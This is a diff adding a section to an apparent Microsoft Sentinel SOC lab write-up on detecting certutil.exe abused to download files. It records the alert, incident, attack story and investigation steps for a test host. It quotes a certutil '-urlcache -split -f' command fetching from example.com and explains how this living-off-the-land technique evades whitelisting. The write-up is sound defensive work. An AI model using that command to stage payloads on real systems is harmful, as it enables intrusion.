@@ -6086,4 +6086,274 @@ If successful and left uninvestigated, this reconnaissance could lead to:
 ⬆️ [**Back to Detection Validation Summary**](https://github.com/SAI1813q/Microsoft-Sentinel-SOC-Lab/blob/main/Detection/README.md#-detection-validation-summary)
 
 ---
+# 🚨 Certutil Download Detection
 
+## 🎯 Detection Overview
+
+This detection demonstrates Microsoft Sentinel identifying the abuse of the native Windows administrative utility **Certutil.exe** to download malicious external files. 
+
+The analytics rule automatically identified suspicious certutil command-line switches used for downloading payloads and generated a **High severity alert**, allowing SOC analysts to investigate command and control (C2) activity and unauthorized file staging.
+
+---
+
+## 📖 Attack Scenario
+
+`Certutil.exe` is a built-in legitimate binary designed for managing Certificate Services. However, because it is trusted and signed by Microsoft, attackers frequently abuse its built-in URL caching and decoding capabilities (such as `-urlcache`, `-split`, or `-f`) to fetch malicious payloads from external web servers while evading application whitelisting and traditional endpoint defenses.
+
+Microsoft Sentinel detected this activity by monitoring process execution logs for instances where `certutil.exe` was invoked with arguments pointing to external URLs (`https://example.com/test.txt`).
+
+---
+
+# 🚨 Alert Generated
+
+## Alert Summary
+
+| Property | Value |
+|----------|-------|
+| **Alert Name** | certutil download |
+| **Severity** | High |
+| **Status** | New |
+| **Classification** | Not Set |
+| **Detection Source** | NRT rules |
+| **Service Source** | Microsoft Sentinel |
+| **Categories** | Command and Control |
+| **Analytics Rule** | certutil download |
+
+---
+
+## Alert Description
+
+The alert was triggered after Microsoft Sentinel detected the abuse of the certutil.exe administrative tool to download malicious external files.
+
+The specific command line observed in the query results was:
+`"C:\Windows\system32\certutil.exe" -urlcache -split -f https://example.com test.txt`
+
+The activity involved:
+
+- 👤 **Account:** `Vm1\Sia123`
+- 💻 **Computer:** `Vm1`
+
+---
+
+## Alert Workflow
+
+```text
+Attacker gains access to host
+          │
+          ▼
+Executes certutil with URL cache parameters
+(Command and Control / Ingress Tool Transfer)
+          │
+          ▼
+Certutil reaches out to external URL and downloads file
+          │
+          ▼
+Process execution logged by OS
+          │
+          ▼
+Microsoft Sentinel NRT Analytics Rule
+          │
+          ▼
+High Severity Alert Generated
+          │
+          ▼
+Microsoft Defender Incident Created
+```
+
+---
+
+## 📸 Alert Overview
+
+> *(Insert Alert Overview Screenshot)*
+
+---
+
+## 📸 Alert Details
+
+> *(Insert Alert Details Screenshot)*
+
+---
+
+## 📸 Query Results
+
+> *(Insert Query Results Screenshot)*
+
+---
+
+# 🚔 Incident Created
+
+## Incident Summary
+
+| Property | Value |
+|----------|-------|
+| **Incident ID** | 49 |
+| **Incident Name** | certutil download |
+| **Severity** | High |
+| **Status** | Active |
+| **Classification** | Unclassified |
+| **Assigned To** | Unassigned |
+| **Active Alerts** | 3 |
+| **Created Automatically** | Yes |
+
+---
+
+## Incident Correlation
+
+Microsoft Defender automatically created Incident 49 based on the Near Real-Time (NRT) detection alerts from Microsoft Sentinel. 
+
+The incident successfully grouped 3 active alerts related to certutil download activity into a single investigation workspace.
+
+---
+
+## 📸 Incident Overview
+
+> *(Insert Incident Overview Screenshot)*
+
+---
+
+# 🕸️ Attack Story
+
+The Attack Story provides a visual relationship between the entities involved in the incident.
+
+Microsoft Defender associated:
+
+- 👤 **User:** `Vm1\Sia123`
+- 💻 **Device:** `Vm1`
+- ⚙️ **Process Group:** 3 Processes identified (`certutil.exe` execution variations)
+
+This allows analysts to quickly understand the execution chain on the affected endpoint and the context of the user account.
+
+---
+
+## 📸 Attack Story
+
+> *(Insert Attack Story Screenshot)*
+
+---
+
+# 🔍 Investigation Graph
+
+The Investigation Graph automatically maps the detailed entities associated with the incident.
+
+### Observed Entities
+
+| Entity Type | Entity |
+|-------------|--------|
+| **User** | `Vm1\Sia123` |
+| **Device** | `Vm1` |
+| **Process Group** | 3 instances of `certutil.exe` download commands |
+
+The graph highlights the repeated execution of `certutil.exe` commands originating from the user session on `Vm1`.
+
+---
+
+## 📸 Investigation Graph
+
+> *(Insert Investigation Graph Screenshot)*
+
+---
+
+# 💻 Impacted Assets
+
+The incident identified the following impacted assets.
+
+## Device
+
+| Property | Value |
+|----------|-------|
+| **Device name** | `Vm1` |
+| **Risk Level** | None |
+
+---
+
+## User
+
+| Property | Value |
+|----------|-------|
+| **User** | `Vm1\Sia123` |
+
+---
+
+## 📸 Impacted Device
+
+> *(Insert Device Screenshot)*
+
+---
+
+## 📸 Impacted User
+
+> *(Insert User Screenshot)*
+
+---
+
+# 🧪 Evidence & Response
+
+Microsoft Defender identified three suspicious process execution events as part of the evidence.
+
+The evidence and response tab recorded the following details:
+
+| Property | Value |
+|----------|-------|
+| **Entity Type** | Process |
+| **Verdict** | Suspicious |
+| **First Seen** | Jul 25, 2026 6:14 PM |
+| **Impacted Assets** | `Vm1` |
+| **Detection Origin** | certutil download |
+
+---
+
+## 📸 Evidence & Response
+
+> *(Insert Evidence Screenshot)*
+
+---
+
+# 📋 Activities
+
+The Activities tab records automated actions performed during the incident lifecycle.
+
+For this incident:
+
+- 🚨 3 Alerts for 'certutil download' were automatically correlated to incident 49 at Jul 25, 2026 6:26 PM.
+- 🤖 Activities were performed by Microsoft Defender XDR via automated triggers.
+
+The activity history provides an audit trail of the automated incident workflow.
+
+---
+
+## 📸 Activities
+
+> *(Insert Activities Screenshot)*
+
+---
+
+# 🛡️ SOC Analyst Investigation
+
+During investigation the analyst should:
+
+- 🔎 Verify the legitimacy of the destination URL (`https://example.com/test.txt`).
+- 📁 Inspect the file system on `Vm1` to locate and remove any files dropped or cached by `certutil.exe`.
+- 👤 Confirm with the user `Vm1\Sia123` if they intentionally executed certutil for certificate management or troubleshooting.
+- ⚙️ Check the parent process of `certutil.exe` to see if it was spawned interactively via `cmd.exe`/`powershell.exe` or by a malicious parent script.
+- 🌐 Review proxy or firewall logs to see if outbound traffic connected to the external IP/domain associated with the download request.
+- 🚨 Isolate the affected endpoint (`Vm1`) if the downloaded payload is confirmed to be malicious.
+
+---
+
+# 🎯 Security Impact
+
+Using built-in administrative binaries like `certutil.exe` for file downloads is a classic Living off the Land (LotL) technique designed to bypass signature-based detections.
+
+Detecting this behavior allows SOC analysts to intercept payload delivery before second-stage malware can be executed.
+
+If successful and left uninvestigated, this download could lead to:
+
+- 📥 Execution of secondary malware payloads (e.g., RATs, ransomware, backdoors)
+- 📡 Establishing Command and Control (C2) communication
+- 🔄 Further lateral movement within the network
+
+---
+
+⬆️ [**Back to Detection Validation Summary**](https://github.com/SAI1813q/Microsoft-Sentinel-SOC-Lab/blob/main/Detection/README.md#-detection-validation-summary)
+
+---
